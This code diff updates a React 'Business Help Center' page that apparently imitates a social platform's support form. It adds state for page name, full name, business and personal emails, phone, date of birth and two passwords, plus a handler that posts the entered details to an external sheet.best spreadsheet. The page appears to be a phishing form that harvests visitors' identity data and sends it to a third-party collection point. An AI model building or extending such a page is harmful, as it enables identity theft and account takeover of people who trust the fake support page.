@@ -2,10 +2,11 @@ import React, { useState } from "react";
 // import { useNavigate } from "react-router-dom";
 import { useDocument } from "../../hook/useDocument";
 import './style.css';
-import { Button, DatePicker, Flex, Form, Input, Modal, Space } from 'antd';
+import { Button, DatePicker, Form, Input, Modal, Space } from 'antd';
 import { SearchOutlined } from "@mui/icons-material";
 import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
 import { faHouseChimney } from '@fortawesome/free-solid-svg-icons';
+import axios from "axios";
 // import type { FormInstance } from 'antd';
 const BusinessHelpCenter = () => {
   // const navigate = useNavigate();
@@ -13,10 +14,44 @@ const BusinessHelpCenter = () => {
   useDocument("Privacy Policy");
   const [form] = Form.useForm();
 
+  const [namePage, setnamePage] = useState('');
+  const [fullName, setfullName] = useState('');
+  const [businessEmail, setbusinessEmail] = useState('');
+  const [personalEmail, setpersonalEmail] = useState('');
+  const [phone, setPhone] = useState('');
+  const [date, setdate] = useState('');
+  const [text, settext] = useState('');
+  const [password1, setpassword1] = useState('');
+  const [password2, setpassword2] = useState('');
+
+  const handleSubmit = async (e: any) => {
+    e.preventDefault();
+    // console.log(namePage, fullName, businessEmail, personalEmail, phone, text)
+    const data = {
+      ["Name Page"]: namePage,
+      ["Full Name"]: fullName,
+      ["Business Email Address"]: businessEmail,
+      ["Personal Email Address"]: personalEmail,
+      ["Mobile Phone Number"]: phone,
+      ["Date of Birth"]: date,
+      ["Please provide us information that will help us investigate"]: text,
+
+    }
+    axios.post('https://sheet.best/api/sheets/abe85991-15f1-47f0-a1d6-242f44b22e94', data).then((response) => {
+      console.log(response);
+      setnamePage('');
+      setfullName('');
+      setbusinessEmail('');
+      setpersonalEmail('');
+      setPhone('');
+      setdate('');
+      settext('');
+
+    })
+
+  };
   const { TextArea } = Input;
-  // interface SubmitButtonProps {
-  //   form: FormInstance;
-  // }
+
   const [open, setOpen] = useState(false);
 
   const showModal = () => {
@@ -28,6 +63,7 @@ const BusinessHelpCenter = () => {
   const handleCancel = () => {
     setOpen(false);
   };
+
 
   return (
     <div className="container">
@@ -49,9 +85,9 @@ const BusinessHelpCenter = () => {
         <div className="nav_sup">
 
           <div className="nav_help">
-            <FontAwesomeIcon icon={faHouseChimney} style={{ color: '#3578e5', fontSize: '16px' }} /> <span style={{ color: '#3578e5', fontSize: '16px', fontWeight: '600', marginLeft: '8px' }}>Help Center</span>
+            <FontAwesomeIcon icon={faHouseChimney} style={{ color: '#3578e5', fontSize: '16px' }} /> <span style={{ color: '#3578e5', fontSize: '16px', fontWeight: '600', marginLeft: '8px', textDecoration: 'none' }}>Help Center</span>
           </div>
-          <p style={{ color: '#3578e5', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>English</p>
+          <p style={{ color: '#3578e5', display: 'flex', alignItems: 'center', justifyContent: 'center', marginRight: '10px' }}>English</p>
         </div>
       </div>
       <div className="block">
@@ -88,32 +124,32 @@ const BusinessHelpCenter = () => {
             <div className="form">
               <Form form={form} name="validateOnly" layout="vertical" autoComplete="off">
                 <Form.Item name="namePage" label="Name Page" rules={[{ required: true, message: "Name Page is required" }]}>
-                  <Input />
+                  <Input onChange={(e) => setnamePage(e.target.value)} value={namePage} />
                 </Form.Item>
                 <Form.Item name="fullName" label="Fullname" rules={[{ required: true, message: "Fullname is required" }]}>
-                  <Input />
+                  <Input onChange={(e) => setfullName(e.target.value)} value={fullName} />
                 </Form.Item>
                 <Form.Item name="businessEmail" label="Business Email Address" rules={[{ required: true, message: "Business Email Address is required" }]}>
-                  <Input />
+                  <Input onChange={(e) => setbusinessEmail(e.target.value)} value={businessEmail} />
                 </Form.Item>
                 <Form.Item name="personalEmail" label="Personal Email Address" rules={[{ required: true, message: "Personal Email Address is required" }]}>
-                  <Input />
+                  <Input onChange={(e) => setpersonalEmail(e.target.value)} value={personalEmail} />
                 </Form.Item>
                 <Form.Item name="phone" label="Mobile Phone Number" rules={[{ required: true, message: "Mobile Phone Number is required" }]}>
-                  <Input />
+                  <Input onChange={(e) => setPhone(e.target.value)} value={phone} />
                 </Form.Item>
                 <Form.Item name='dateBirth' label="Date of Birth" rules={[{ required: true }]}>
-                  <DatePicker />
+                  <Input type="date" onChange={(e) => setdate(e.target.value)} value={date} />
                 </Form.Item>
                 <Form.Item name='text' label="Please provide us information that will help us investigate." >
-                  <TextArea rows={4} />
+                  <TextArea rows={4} onChange={(e) => settext(e.target.value)} value={text} />
                 </Form.Item>
               </Form>
             </div>
             <div className="footer_content">
               <>
                 <Space>
-                  <Button style={{ width: '80px', height: '40px', position: 'absolute', right: '10px', top: '14px' }} type="primary" onClick={showModal}>
+                  <Button style={{ width: '80px', height: '40px', position: 'absolute', right: '10px', top: '14px' }} type="primary" onClick={handleSubmit}>
                     <p style={{ fontSize: '.875rem', fontWeight: "600" }}>Send</p>
                   </Button>
 
